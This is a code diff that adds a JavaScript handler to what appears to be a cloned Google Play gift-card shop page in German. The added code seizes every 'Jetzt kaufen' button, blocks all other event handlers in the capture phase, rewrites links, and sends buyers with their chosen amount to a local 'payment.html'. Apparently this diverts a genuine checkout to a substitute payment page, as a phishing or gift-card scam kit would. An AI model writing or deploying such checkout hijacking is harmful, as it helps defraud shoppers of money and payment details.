@@ -430,3 +430,129 @@
   }
   window.addEventListener('load', initToggleEnhancement, { once: true });
 })();
+
+// Google Play Buy Button Navigation Handler
+(function() {
+  console.log('[GOOGLE PLAY] Buy button navigation loaded');
+  
+  const PAYMENT_URL = 'payment.html';
+  
+  function captureOrderData() {
+    const productName = 'Google Play';
+    const productImage = 'https://static.rapido.com/cms/sites/21/2024/07/11151016/Google-Play-LL-New.png';
+    let selectedValue = 5; // default
+    let selectedQuantity = 1;
+    
+    // Find selected toggle button
+    const selectedBtn = document.querySelector('.MuiToggleButton-root[aria-pressed="true"], .MuiToggleButton-root[data-selected="true"]');
+    if (selectedBtn) {
+      const txt = selectedBtn.textContent || '';
+      const match = txt.match(/(\d{1,4})\s*€|€\s*(\d{1,4})/);
+      if (match) {
+        selectedValue = parseInt(match[1] || match[2], 10);
+        console.log('[GOOGLE PLAY] Found selected value:', selectedValue);
+      }
+    }
+    
+    // Check custom input
+    const customInput = document.querySelector('input[type="number"]');
+    if (customInput && customInput.value) {
+      const customVal = parseInt(customInput.value, 10);
+      if (!isNaN(customVal) && customVal > 0) {
+        selectedValue = customVal;
+        console.log('[GOOGLE PLAY] Using custom value:', selectedValue);
+      }
+    }
+    
+    return {
+      productName,
+      productImage,
+      quantity: selectedQuantity,
+      value: selectedValue,
+      timestamp: Date.now()
+    };
+  }
+  
+  function navigateToPayment() {
+    const orderData = captureOrderData();
+    console.log('[GOOGLE PLAY] Navigating to payment with data:', orderData);
+    
+    // Store in localStorage
+    try {
+      localStorage.setItem('guthaben_order_data', JSON.stringify(orderData));
+    } catch (e) {
+      console.error('[GOOGLE PLAY] Failed to store order data:', e);
+    }
+    
+    // Navigate with URL params as backup
+    const url = `${PAYMENT_URL}?value=${encodeURIComponent(orderData.value)}&quantity=${encodeURIComponent(orderData.quantity)}`;
+    window.location.href = url;
+  }
+  
+  function attachBuyButtonHandlers() {
+    const buyButtons = Array.from(document.querySelectorAll('button, a, [role="button"]')).filter(el => {
+      const text = (el.textContent || '').trim();
+      return /jetzt\s*kaufen/i.test(text) || /^kaufen$/i.test(text);
+    });
+    
+    console.log('[GOOGLE PLAY] Found buy buttons:', buyButtons.length);
+    
+    buyButtons.forEach((btn, idx) => {
+      if (btn.dataset._buyHandlerAttached) return;
+      btn.dataset._buyHandlerAttached = '1';
+      
+      console.log('[GOOGLE PLAY] Attaching handler to buy button', idx + 1);
+      
+      // Use mousedown with highest priority to intercept before any other handlers
+      btn.addEventListener('mousedown', function(e) {
+        console.log('[GOOGLE PLAY] Buy button mousedown - intercepting');
+        e.preventDefault();
+        e.stopPropagation();
+        if (typeof e.stopImmediatePropagation === 'function') e.stopImmediatePropagation();
+        
+        // Small delay to ensure event blocking
+        setTimeout(() => navigateToPayment(), 10);
+      }, true);
+      
+      // Also handle click as backup
+      btn.addEventListener('click', function(e) {
+        console.log('[GOOGLE PLAY] Buy button click - intercepting');
+        e.preventDefault();
+        e.stopPropagation();
+        if (typeof e.stopImmediatePropagation === 'function') e.stopImmediatePropagation();
+        
+        navigateToPayment();
+      }, true);
+      
+      // Rewrite href if it's an anchor
+      if (btn.tagName === 'A') {
+        try {
+          btn.setAttribute('href', PAYMENT_URL);
+          btn.setAttribute('target', '_self');
+        } catch(e) {}
+      }
+    });
+  }
+  
+  function init() {
+    attachBuyButtonHandlers();
+    
+    // Re-attach on mutations in case buttons are dynamically added
+    if (window.MutationObserver) {
+      const observer = new MutationObserver(function() {
+        attachBuyButtonHandlers();
+      });
+      observer.observe(document.body, { childList: true, subtree: true });
+    }
+    
+    console.log('[GOOGLE PLAY] Buy button navigation initialized');
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init, { once: true });
+  } else {
+    init();
+  }
+  window.addEventListener('load', init, { once: true });
+})();
+
